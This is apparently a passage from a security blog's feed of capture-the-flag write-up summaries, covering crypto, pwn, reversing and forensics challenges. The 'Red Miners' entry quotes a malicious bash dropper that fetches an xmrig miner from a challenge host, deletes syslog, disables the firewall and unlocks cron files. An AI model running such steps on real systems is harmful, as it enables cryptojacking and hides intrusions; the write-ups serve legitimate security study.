We can start thinking of Server-Side Request Forgery (SSRF). As in other challenges, we know that the web server listens on port 1337, so let&amp;rsquo;s try and get http://127.</description></item><item><title>Red Miners</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/red-miners/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/red-miners/</guid><description>We are given the following Bash script:
#!/bin/bash checkTarget() { EXPECTED_USERNAME="root7654" EXPECTED_HOSTNAME_PREFIX="UNZ-" CURRENT_USERNAME=$(whoami) CURRENT_HOSTNAME=$(hostname) if [[ "$CURRENT_USERNAME" != "$EXPECTED_USERNAME" ]]; then exit 1 fi if [[ ! "$CURRENT_HOSTNAME" == "$EXPECTED_HOSTNAME_PREFIX"* ]]; then exit 1 fi } BIN_MD5="96cc922d3eb9ef23859377119332f8d7" BIN_DOWNLOAD_URL="http://tossacoin.htb/xmrig" BIN_DOWNLOAD_URL2="http://tossacoin.htb/xmrig" BIN_NAME="xmrig" cleanEnv() { ulimit -n 65535 rm -rf /var/log/syslog chattr -iua /tmp/ chattr -iua /var/tmp/ chattr -R -i /var/spool/cron chattr -i /etc/crontab ufw disable iptables -F echo "nope" &amp;gt;/tmp/log_rot sudo sysctl kernel.</description></item><item><title>Redaction gone wrong</title><link>https://7rocky.github.io/en/ctf/picoctf/forensics/redaction-gone-wrong/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/forensics/redaction-gone-wrong/</guid><description>We are given a PDF file called Financial_Report_for_ABC_Labs.pdf. It shows some text:
But there are some words that where hidden using a kind of black &amp;ldquo;background color&amp;rdquo;. However, we can still select the whole text using the mouse, and there is the flag:
Financial Report for ABC Labs, Kigali, Rwanda for the year 2021. Breakdown - Just painted over in MS word. Cost Benefit Analysis Credit Debit This is not the flag, keep looking Expenses from the picoCTF{C4n_Y0u_S33_m3_fully} Redacted document.</description></item><item><title>Reflection</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/reflection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/reflection/</guid><description>We are given a binary file called reflection:
$ file reflection reflection: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d57b0acdb0fda3fe599c48fa63ca61e7694b8b60, for GNU/Linux 3.2.0, not stripped If we open Ghidra and take a look at the decompiled C source code, we will see the main function:
undefined8 main() { long j; char *__format; byte flag_input[100]; int k; int _j; int _length; int i; int length; printf("</description></item><item><title>Reg</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/reg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/reg/</guid><description>We are given a 64-bit binary called reg:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) We can use Ghidra to analyze the binary and look at the decompiled source code in C. This is main:
int main() { run(); return 0; } Let&amp;rsquo;s see run:
void run() { char local_38[48]; initialize(); printf("Enter your name : "); gets(local_38); puts("Registered!"); return; } The binary is vulnerable to Buffer Overflow since there is a variable called local_38 that has 48 bytes assigned as buffer, but the program is using gets, which is an insecure function because it does not limit the length of the input data, thus overflowing the reserved buffer if the size of the input data is greater than 48 bytes.</description></item><item><title>Relatively Small Arguments</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/relatively-small-arguments/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/relatively-small-arguments/</guid><description>We are given the Python source code used to encrypt the flag:
#!/usr/bin/env python3 from Crypto.Util.number import * p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = getPrime(32) e = pow(d, -1, phi) m = bytes_to_long(open('flag.txt', 'rb').read()) c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') ''' n = 134872711253918655399533296784203466697159038260837702891888089821702090938512308686613559851138816682269099219724900870388583883202954112422023894133671598222066489215524613014212242490437041258588247678792591072443719118562580052842727775772283919113007499992167089258075609504428713653013187230671841726369 e = 50920242742169837294267124730818234703309561711363177522992049271988492365017092545331352650316729342598781520444569769450329777448285534584484096179230968844630486688656705514759778561817709539781927624692111848722199024819005269510690240743887870339853351421726436719236180272680237157536332997570569192069 c = 133155317855020316110137499609990113815646625767974277474197900721563685454745247616867035013963212538345727281661922602291072931578581035070345294335733120033652413487827994383327148598029065495228796201084369245315585407592741900307825557286213370482646401885352854920924352919398804532780740979273692054391 ''' The encryption type is RSA, but the implementation is wrong.</description></item><item><title>Relic Maps</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/relic-maps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/relic-maps/</guid><description>We have this description for the challenge:
Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows? Investigate the given attachment and figure out what&amp;rsquo;s going on and get the flag.</description></item><item><title>Relic Maps</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/relic-maps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/relic-maps/</guid><description>We have this description for the challenge:
Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows? Investigate the given attachment and figure out what&amp;rsquo;s going on and get the flag.</description></item><item><title>Restricted</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/restricted/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/restricted/</guid><description>We are given a remote instance to connect to:
$ nc 64.227.41.83 30543 SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 Invalid SSH identification string. Ncat: Broken pipe. It looks like we must access via SSH.
SSH connection We are also given some files:
$ tree . ├── Dockerfile ├── build_docker.sh └── src ├── bash_profile ├── flag.txt └── sshd_config 2 directories, 5 files Loooking at the Dockerfile, we see that the user is named restricted and we will be using rbash (restricted Bash):</description></item><item><title>Reverse Polarity</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/reverse-polarity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/reverse-polarity/</guid><description>We are given this stream of bits from a hard drive:
10000110101010001000110011011000110010101100001011100100110111001111011010000100110100101110100010111110100011001101100011010010111000001110000011010010110111001111101 We need to represent it in readable characters. First, we can use Python to express the binary stream as a hexadecimal number:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; hex(0b10000110101010001000110011011000110010101100001011100100110111001111011010000100110100101110100010111110100011001101100011010010111000001110000011010010110111001111101) '0x4354466c6561726e7b4269745f466c697070696e7d' Notice that we must add 0b to tell Python that the number is in binary format.
From the hexadecimal digits, we can foresee that these are ASCII characters (i.e. 0x43 is C, 0x54 is T and 0x46 is F).</description></item><item><title>Reykjavik</title><link>https://7rocky.github.io/en/ctf/ctflearn/reverse-engineering/reykjavik/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/reverse-engineering/reykjavik/</guid><description>We have a 64-bit binary called Reykjavik:
$ file Reykjavik Reykjavik: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bc04368dbcefb4491573ac8feea3a32e31ed59f, for GNU/Linux 3.2.0, not stripped If we execute it, we see that it needs a command line argument:
$ ./Reykjavik Usage: Reykjavik CTFlearn{flag} $ ./Reykjavik 'CTFlearn{flag}' Welcome to the CTFlearn Reversing Challenge Reykjavik v2: CTFlearn{flag} Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse Sorry Dude, 'CTFlearn{flag}' is not the flag :-( Let&amp;rsquo;s run GDB to debug the program.</description></item><item><title>Right Decision</title><link>https://7rocky.github.io/en/ctf/other/ctfzone/right-decision/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ctfzone/right-decision/</guid><description>We are given the Python source code of the server:
import random import string import Crypto.Util.number as number import numpy as np import json import socketserver import galois from hashlib import md5 PORT = 31339 with open('params.txt') as f: params = json.load(f) p = params['galois_p'] k = params['k'] n = params['RSA_n'] gf = galois.GF(p,verify=False,primitive_element=2) with open('votes.txt') as f: votes = json.load(f) with open('flag.txt') as f: flag = f.read() def check_secret(s): #check if secret is real phi for public key n return pow(2,s,n)==1 def parse_new_vote(data): all_votes = votes.</description></item><item><title>RIP my bof</title><link>https://7rocky.github.io/en/ctf/ctflearn/binary/rip-my-bof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/binary/rip-my-bof/</guid><description>We are given a 32-bit binary called server:
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) We also have the C source code. Basically, what the program does is call function gets, which is vulnerable to Buffer Overflow:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; // Defined in a separate source file for simplicity. void init_visualize(char* buff); void visualize(char* buff); void win() { system("</description></item><item><title>RiseFromTheDead</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/risefromthedead/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/risefromthedead/</guid><description>We are given a 64-bit binary called rise and also a core file:
$ file * core: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './rise flag', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: './rise', platform: 'x86_64' rise: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8341bf2064b7903b6e87d69c63a1849338d3f1e6, for GNU/Linux 3.2.0, not stripped The core file corresponds to an execution of rise (actually, the command was .</description></item><item><title>RiseFromTheDead</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/risefromthedead/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/risefromthedead/</guid><description>We are given a 64-bit binary called rise and also a core file:
$ file * core: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './rise flag', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: './rise', platform: 'x86_64' rise: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8341bf2064b7903b6e87d69c63a1849338d3f1e6, for GNU/Linux 3.2.0, not stripped The core file corresponds to an execution of rise (actually, the command was .</description></item><item><title>RLotto</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/rlotto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/rlotto/</guid><description>We are given the source code of a server that gives five numbers and the objective is to guess the next five numbers to win the lottery:
$ nc 46.101.63.21 31102 __/\____/\____/\____/\____/\____/\____/\____/\__ \ /\ /\ /\ /\ /\ /\ /\ / /_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\ \/ \/ \/ \/ \/ \/ \/ \/ __ _ _ ____ ___ ____ ___ / / ___ | |_| |_ ___|___ \ / _ \___ \ / _ \ / / / _ \| __| __/ _ \ __) | | | |__) | | | | / /__| (_) | |_| || (_) / __/| |_| / __/| |_| | \____/\___/ \__|\__\___/_____|\___/_____|\___/ __/\____/\____/\____/\____/\____/\____/\____/\__ \ /\ /\ /\ /\ /\ /\ /\ / /_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\ \/ \/ \/ \/ \/ \/ \/ \/ ------------------------------------------------ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 ------------------------------------------------ [+] EXTRACTION: 11 32 87 35 89 [?</description></item><item><title>Robot Factory</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/</guid><description>We are given a 64-bit binary called robot_factory:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Moreover, we also have the remote Glibc library (libc.so.6). Let&amp;rsquo;s patch the binary with pwninit:
$ pwninit --bin robot_factory --libc libc.so.6 --no-template bin: robot_factory libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.2_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.2_amd64.deb warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2) setting .</description></item><item><title>Robot Factory</title><link>https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/</guid><description>We are given a 64-bit binary called main:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) We are given a Dockerfile that starts with FROM ubuntu:18.04, so we take Glibc from the container and use pwninit to patch the binary:
$ docker run --rm -v "$(pwd)":/home/rocky -it ubuntu:18.04 bash root@c591782492e6:/# ldd /bin/sh linux-vdso.so.1 (0x00007ffde1fb3000) libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbcde5ef000) /lib64/ld-linux-x86-64.so.2 (0x00007fbcdec00000) root@c591782492e6:/# /lib64/ld-linux-x86-64.so.2 /lib/x86_64-linux-gnu/libc.so.6 GNU C Library (Ubuntu GLIBC 2.</description></item><item><title>Robotic</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/robotic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/robotic/</guid><description>We are given this website (https://eth007.me/):
Since the name of the challenge is &amp;ldquo;Robotic&amp;rdquo;, we might think about robots.txt, which is a file used by web crawlers to index pages of a website in search engines like Google. There we have the resource:
Flag If we follow that URL (which is marked as Disallow for web crawlers), we will see the flag:
$ curl https://eth007.me/10b20f3d29ba114a.txt ictf{truly_not_a_robot}</description></item><item><title>Rolled my own Crypto</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/rolled-my-own-crypto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/rolled-my-own-crypto/</guid><description>We are given the source code of a server that runs a Digital Signature Algorithm (DSA):
from Crypto.Util.number import getPrime, isPrime, inverse from hashlib import sha256 from random import randrange q, g = 0, 2 while not isPrime(p := 2 * q + 1) or pow(g, q, p) != 1: q = getPrime(256) x = randrange(2, q) y = pow(g, x, p) def H(m): return int.from_bytes(sha256(m).digest(), 'big') def sign(m): k = randrange(2, q) r = pow(g, k, p) % q s = (H(m) + r * x) * inverse(k, q) % q return r, s def verify(m, r, s): u = inverse(s, q) return pow(g, u * H(m), p) * pow(y, u * r, p) % p % q == r def main(): print("</description></item><item><title>Ron was wrong, Whit is right</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/ron-was-wrong-whit-is-right/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/ron-was-wrong-whit-is-right/</guid><description>We are given the source code used to encrypt the flag:
#!/usr/bin/env python from Crypto.Util import number flag = open("flag.txt", "rb").read() m = number.bytes_to_long(flag) e = 65537 for _ in range(1336): q = number.getPrime(1024) p = number.getPrime(1024) n = p * q c = pow(m, e, n) print(f"{n},{c}") We also have the output (1336 pairs of n and c).
RSA background Let&amp;rsquo;s review how RSA works: $n = p q$, where $p$ and $q$ are some large prime numbers.</description></item><item><title>Rookie Mistake</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/rookie-mistake/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/rookie-mistake/</guid><description>We are given the Python source code that encrypts the flag:
import os from Crypto.Util.number import bytes_to_long, getPrime from sympy import * from secret import flag flag1 = bytes_to_long(flag[:len(flag)//2] + os.urandom(69)) flag2 = bytes_to_long(flag[len(flag)//2:] + os.urandom(200)) def genprime(): p = 2 while p.bit_length() &amp;lt; 1020: p *= getPrime(30) while True: x = getPrime(16) if isprime((p * x) + 1): return (p * x) + 1 break p,q = [genprime() for _ in range(2)] print("</description></item><item><title>rop-2.35</title><link>https://7rocky.github.io/en/ctf/other/seccon-ctf/rop-2.35/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/seccon-ctf/rop-2.35/</guid><description>We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Setup environment We also have a Dockerfile:
FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get -y update RUN apt-get -y install xinetd RUN groupadd -r pwn &amp;amp;&amp;amp; useradd -r -g pwn pwn RUN echo '#!/bin/bash\n\ service xinetd restart &amp;amp;&amp;amp; /bin/sleep infinity' &amp;gt; /etc/init.sh RUN echo 'service pwn\n\ {\n\ type = UNLISTED\n\ disable = no\n\ socket_type = stream\n\ protocol = tcp\n\ wait = no\n\ user = pwn\n\ bind = 0.</description></item><item><title>Rotating Secret Assembler</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/rotating-secret-assembler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/rotating-secret-assembler/</guid><description>We are given a host to connect to. It shows the source code used to encrypt the flag:
$ nc puzzler7.imaginaryctf.org 3000 ================================================================================ #!/usr/bin/env python3 from Crypto.Util.number import * class Rotator: QUEUE_LENGTH = 10 def __init__(self): self.e = 65537 self.m = bytes_to_long(open('flag.txt', 'rb').read()) self.queue = [getPrime(512) for i in range(self.QUEUE_LENGTH)] def get_new_primes(self): ret = self.queue[-2:] self.queue.pop() while(len(self.queue) &amp;lt; self.QUEUE_LENGTH): self.queue = [getPrime(512)] + self.queue return tuple(ret) def enc_flag(self): p, q = self.</description></item><item><title>Roten</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/roten/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/roten/</guid><description>We are given a PCAP file (challenge.pcap) with a lot of network packets:
Finding the attack vector First of all, let&amp;rsquo;s filter by HTTP to read only high-level network packets:
The attacker is poking around with the website. For instance, they are trying to use POST parameters:
If we go to the end of the packet capture, we will see that the attackers are executing system commands:
In the above ls command, we see a file called galacticmap-php that looks suspicious.</description></item><item><title>Roulette</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/roulette/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/roulette/</guid><description>We are provided with the server source code in Python:
import socketserver import signal from twister import Twister def handle(self): signal.alarm(500) self.write("Welcome to the Casino") self.write("We are playing roulette today") money = 50 random = Twister() self.write("The wheel stops on a number between 0 and 31.") self.write("\n") while money &amp;gt; 0: self.write("You have {} coins".format(money)) self.write("What would you like to bet on:") self.write("1) Even") self.write("2) Odd") self.write("3) Number") option = int(self.</description></item><item><title>rps-casino</title><link>https://7rocky.github.io/en/ctf/other/dicectf/rps-casino/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/dicectf/rps-casino/</guid><description>We are given the Python source code of the server:
#!/usr/local/bin/python import os from Crypto.Util.number import bytes_to_long def LFSR(): state = bytes_to_long(os.urandom(8)) while 1: yield state &amp;amp; 0xf for i in range(4): bit = (state ^ (state &amp;gt;&amp;gt; 1) ^ (state &amp;gt;&amp;gt; 3) ^ (state &amp;gt;&amp;gt; 4)) &amp;amp; 1 state = (state &amp;gt;&amp;gt; 1) | (bit &amp;lt;&amp;lt; 63) rng = LFSR() n = 56 print(f"Let's play rock-paper-scissors! We'll give you {n} free games"</description></item><item><title>RRSSAA</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/rrssaa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/rrssaa/</guid><description>My primes are prefectly random. I wonder if you can find them.
Challenge contributed by CryptoHack
Challenge files:
output.txt RRSSAA.py Source code analysis We are given the following Python script that uses RSA to encrypt the flag:
flag = open("flag.txt", "rb").read().strip() assert len(flag) == 128 N = prod(get_prime(i) for i in range(2, len(flag))) print(hex(N), hex(pow(bytes_to_long(flag), 0x10001, N))) The RSA setup is not the usual one. This time, we have a multi-prime RSA setup, where each prime factor of the modulus $n$ is computed with get_prime:</description></item><item><title>RSA 4.0</title><link>https://7rocky.github.io/en/ctf/other/seccon-ctf/rsa-4.0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/seccon-ctf/rsa-4.0/</guid><description>We are given the source code in SageMath to encrypt the flag:
import os from Crypto.Util.number import bytes_to_long, getStrongPrime m = bytes_to_long(os.getenvb(b"FLAG", b"FAKEFLAG{THIS_IS_FAKE}")) e = 0x10001 p = getStrongPrime(1024, e=e) q = getStrongPrime(1024, e=e) n = p * q assert m &amp;lt; n Q = QuaternionAlgebra(Zmod(n), -1, -1) i, j, k = Q.gens() enc = ( 1 * m + (3 * m + 1 * p + 337 * q) * i + (3 * m + 13 * p + 37 * q) * j + (7 * m + 133 * p + 7 * q) * k ) ** e print(f"</description></item><item><title>RSA Beginner</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/rsa-beginner/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/rsa-beginner/</guid><description>We are given these numbers:
e: 3 c: 174422460809195453539354885823735245900172562989776845322302 n: 245841236512478852752909734912575581815967630033049838269083 We have the exponent $e$, the modulus $n$ and the ciphertext $c$.
It is clear that we have an RSA cryptosystem. Let&amp;rsquo;s review how RSA works:
Two prime numbers $p$ and $q$ are chosen so that we have the modulus $n = p \cdot q$. Then an exponent $e$ is chosen (usually 3 or 65537) so that it is coprime with $\phi(n) = (p - 1) \cdot (q - 1)$.</description></item><item><title>RSA Noob</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/rsa-noob/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/rsa-noob/</guid><description>We are given these numbers:
e: 1 c: 108193852288406505568171818194994500452464483136775497973720445 n: 1522605027922533360535618378132637429718068114961380688657908494580122963258952897654000350692006139 We have the exponent $e$, the modulus $n$ and the ciphertext $c$.
It is clear that we have an RSA cryptosystem. Let&amp;rsquo;s review how RSA works:
Two prime numbers $p$ and $q$ are chosen so that we have the modulus $n = p \cdot q$. Then an exponent $e$ is chosen (usually 3 or 65537) so that it is coprime with $\phi(n) = (p - 1) \cdot (q - 1)$.</description></item><item><title>RsaCtfTool</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/rsactftool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/rsactftool/</guid><description>We are given an RSA public key in PEM format (pubkey.pem):
-----BEGIN PUBLIC KEY----- MIHeMA0GCSqGSIb3DQEBAQUAA4HMADCByAKBwHfR4yv+QfsHYSvLlS6LGW2cMDlB 3RlH1PteD7gN6nU4KhyMlRznOUQI7cgB082btMWs1usPYfUSrqkDs+1EDrzzw42M G683YvLlJRfcO2syc+YNJTDqtVHW5V3SNJ2J+WKCw0A5+ab2qA+sfhRFhvPJ7gsL vUj+blt5qweyGVheMOQvy+WXI+Vi/jwtlW3it25kBLZUoESDBg+HZKnxz3MgcJ6X roMdjPPwTH2f8sOrCTI1jJzNUYxJ9JQ0QPTrxwIDAQAB -----END PUBLIC KEY----- We can open it in Python and see what values we have:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; from Crypto.PublicKey import RSA &amp;gt;&amp;gt;&amp;gt; with open('pubkey.pem') as f: ... key = RSA.import_key(f.read()) ... &amp;gt;&amp;gt;&amp;gt; key.e 65537 &amp;gt;&amp;gt;&amp;gt; key.n 1128137999850045612492145429133282716267233566834715456536184965477269592934207986950131365518741418540788596074115883774105736493742449131477464976858161587355643311888741515506653603321337485523828144179637379528510277430032789458804637543905426347328041281785616616421292879871785633181756858096548411753919440011378411476275900648915887370219369154688926914542233244450724820670256654513052812215949495598592852131398736567134556141744727764716053145639513031 We can try to factor the modulus $n$ so that we get the private prime numbers $p$ and $q$ of a common RSA cryptosystem.</description></item><item><title>RSAgain</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/rsagain/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/rsagain/</guid><description>We are given the source code used to encrypt the flag:
from Crypto.Util.number import getPrime from secrets import randbelow flag = b'ictf{???????????????}' m = int.from_bytes(flag, 'big') p, q = getPrime(1024), getPrime(1024) n = p*q e1 = 7*randbelow(n) e2 = 7*randbelow(n) c1 = pow(m, e1, n) c2 = pow(m, e2, n) print('n =', n) print('e =', [e1, e2]) print('c =', [c1, c2]) And the output of the above script:
n = 13761685901869725143768331354410331722080881206892978316226355274731948923788116922997132633408042821072846131527848521009073675634635614838798409359054501234184243307064644162477264359675732802892743867662331151938667918459410404673473173649215468906981810925676420598006739662864501852090661953622948938870414604397215114998121635153443376761422254645059647616441054621053792673427510353100668664861428374057353161172637671266095296358943110920490442118842860397633084527337550938542697953483620271948205306390349644786873542968679812523808277314879159441909502558166069319615649241027566862990490220961067181937669 e = [176102760168508342366248560703991436320546222245646770978202319048411166429566382514628949532380311738047680739422807353850798607282412088644610303686988373545251970947896120364153937039760741931013881201304685285276800581219089376477570281711773721947249912869605837122685995085027900352995492083277384406401003380587567849080200688516195340372450525399311095577291241729818923687928903049024986910768913495050369506538600090893434395973537955406795607398026050382337136405732255493959814072239958699297858559423614495730987219798816735202147878946461603285288373867465864345098892545645132818258947898456430424006, 3573981821831492277529738650073504616174769536804810418010981678130362702872320797121521713323943777400757776843305922735161754061510443680673867557929082126015295854646693109385804251924239205353662684744351670833911869748673257355076814511174326199099866635753979773946343291340766410907901834068770274767020404800822067211027120846913766665910218577234432145411130775944881987043775179494758158033064351482298980282644264138853891021708458121104223946012736356102642750591504966939159058542007824839461238347551623770276126868717421123099282388441377112476606520160468063905419246868567792524706613954405034280745] c = [2442003451487395252876121378320580564808335180996151717051522763081890537479875202133875395729806314814096885940653943728394923611282999540770370852775313679101585158491964936530361527619836260073209497935763771182203301056707656219921717552895243715201530990757549283670161276843945223662108755382731302991164300014685362347621843020642892430217171795396599343678165183180757721956247558358291103649246073117361482130651740512048690900488267309376415549379476398675385332885750364853460566103195169529710541031930399449866328356546569547859848315600711606485060302078139530732323306248727557394224647978798154455432, 5877775554635189664514035705193818872462952989637173497670868665060589927366277311749438728976759716021062894771294263103329901952516874052114135886783478914172913186895498679544398990747998647492211189869428581232686408690719184490347471496179923775491153260487724884204595180798615723157844735887389748026739587255981069056269993158062939424519078722321933831961667178045072850177889672933456786971303039062246151676207874781304093381264675070371899409850042467776910769703994219307749656616821280706978085046384421702389657326825914608919485710624515946600476275010829782060955742590243380095470169814313117059260] The encryption type is RSA, but the implementation is wrong because the message m is being encrypted two times with different public exponents (e[0] and e[1]) and the same public modulus n.</description></item><item><title>runme.py</title><link>https://7rocky.github.io/en/ctf/picoctf/general-skills/runme.py/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/general-skills/runme.py/</guid><description>We are given a Python script and we are told to run it:
$ python3 runme.py picoCTF{run_s4n1ty_run}</description></item><item><title>Russian Roulette</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/russian-roulette/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/russian-roulette/</guid><description>We are given a Solidity file called RussianRoulette.sol:
